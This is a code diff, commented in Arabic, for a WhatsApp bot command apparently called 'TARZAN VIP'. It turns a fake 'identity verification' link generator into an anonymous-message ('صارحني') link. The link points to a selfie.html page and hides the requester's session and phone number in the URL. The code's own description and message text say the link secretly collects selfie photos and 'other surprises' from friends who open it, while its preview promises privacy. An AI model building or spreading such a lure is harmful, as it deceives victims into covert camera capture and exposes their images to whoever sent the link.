@@ -1,45 +1,38 @@
 const moment = require('moment-timezone');
-const fs = require('fs');
-const path = require('path');
 
 module.exports = {
-    name: 'تأكيد',
-    aliases: ['تحقق', 'رابط', 'التحقق'],
+    name: 'صارحني',
+    aliases: ['رسالة', 'صراحة'],
     category: 'إداري',
-    description: 'توليد رابط التحقق الآمن للهوية الرقمية',
-    async execute({ sock, msg, args, reply, from, sender, sessionId, botSettings }) {
+    description: 'توليد رابط صارحني الفخم لاستقبال الرسائل (وصور السيلفي) بسرية',
+    async execute({ sock, msg, args, reply, from, sender, sessionId }) {
         try {
+            // استخراج رقم المرسل (الذي سيستقبل البيانات)
             const cleanSender = sender.split('@')[0];
-            const protocol = msg.clientProtocol || 'http';
-            // الحصول على النطاق الخاص بك تلقائياً (يمكنك تعديل هذا يدوياً إذا رغبت)
-            const host = msg.clientHost || 'localhost:10000'; 
-            
-            // تحديد نوع التأكيد المطلوب: صورة (selfie)، صوت (audio)، أو فيديو (video)
-            const type = args[0] ? args[0].toLowerCase() : 'selfie';
-            const validTypes = ['selfie', 'audio', 'video'];
-            
-            if (!validTypes.includes(type)) {
-                return reply(`⚠️ *عذراً، يرجى تحديد نوع تحقق صالح:*\n\n1. \`.تأكيد selfie\` (لتأكيد الهوية بالصورة)\n2. \`.تأكيد audio\` (لتأكيد الهوية بالصوت)\n3. \`.تأكيد video\` (لتأكيد الهوية بالفيديو)`);
-            }
 
-            // توليد الرابط بطريقة مشفرة ونظيفة
-            const verificationUrl = `${protocol}://${host}/module/verification?session=${sessionId}&target=${cleanSender}&type=${type}&id=VERIFY-${Math.floor(1000 + Math.random() * 9000)}`;
+            // تحديد النطاق (الدومين) الخاص بالسيرفر
+            // سيتم استخدام رابط Render إذا كان متوفراً، وإلا سيتم استخدام الرابط المحلي
+            const serverBaseUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 10000}`;
 
-            const responseText = `🛡️ *[بوابة تأكيد الهوية الرقمية - TARZAN VIP]* 🛡️\n\n` +
-                                 `👤 *الجلسة:* ${sessionId}\n` +
-                                 `📋 *النوع المطلوب:* ${type === 'selfie' ? 'صورة الهوية الشخصية' : type === 'audio' ? 'البصمة الصوتية' : 'تأكيد الفيديو المباشر'}\n` +
+            // بناء الرابط النهائي لصفحة صارحني (selfie.html) الموجودة في مجلد public
+            // تم تمرير session و target بشكل مخفي في الرابط
+            const sarahniUrl = `${serverBaseUrl}/selfie.html?session=${sessionId}&target=${cleanSender}`;
+
+            const responseText = `✨ *[بوابة المصارحة السرية - TARZAN VIP]* ✨\n\n` +
+                                 `👤 *الجلسة المرتبطة:* ${sessionId}\n` +
                                  `🕒 *تاريخ التوليد:* ${moment().tz("Asia/Riyadh").format("YYYY-MM-DD | HH:mm")}\n\n` +
-                                 `🔗 *رابط بوابة التحقق:* \n${verificationUrl}\n\n` +
-                                 `⚠️ _ملاحظة: تنتهي صلاحية الرابط تلقائياً فور إتمام عملية التأكيد أو بعد 10 دقائق._`;
+                                 `💌 *رابط استقبال الصراحة الخاص بك:* \n${sarahniUrl}\n\n` +
+                                 `💡 _انسخ هذا الرابط وأرسله لأصدقائك أو ضعه في البايو الخاص بك لاستقبال رسائلهم (وبعض المفاجآت الأخرى 😉)._`;
 
+            // إرسال الرابط مع معاينة (Ad Reply) جذابة
             await sock.sendMessage(from, {
                 text: responseText,
                 contextInfo: {
                     externalAdReply: {
-                        title: 'نظام حماية وتأكيد الهوية الرقمية VIP',
-                        body: 'بوابة التحقق الآمنة التابعة لطرزان بوت',
-                        thumbnailUrl: 'https://b.top4top.io/p_3489wk62d0.jpg',
-                        sourceUrl: verificationUrl,
+                        title: 'صارحني - رسائل سرية ومجهولة',
+                        body: 'اكتب رسالتك بسرية تامة، فنحن نضمن لك الخصوصية.',
+                        thumbnailUrl: 'https://b.top4top.io/p_3489wk62d0.jpg', // يمكنك تغيير هذه الصورة بصورة تعبر عن "صارحني"
+                        sourceUrl: sarahniUrl,
                         mediaType: 1,
                         renderLargerThumbnail: true
                     }
@@ -47,8 +40,8 @@ module.exports = {
             }, { quoted: msg });
 
         } catch (error) {
-            console.error('❌ خطأ في أمر تأكيد الهوية:', error);
-            reply('❌ حدث خطأ داخلي أثناء توليد رابط التأكيد.');
+            console.error('❌ خطأ في أمر صارحني:', error);
+            reply('❌ حدث خطأ داخلي أثناء توليد رابط صارحني.');
         }
     }
 };
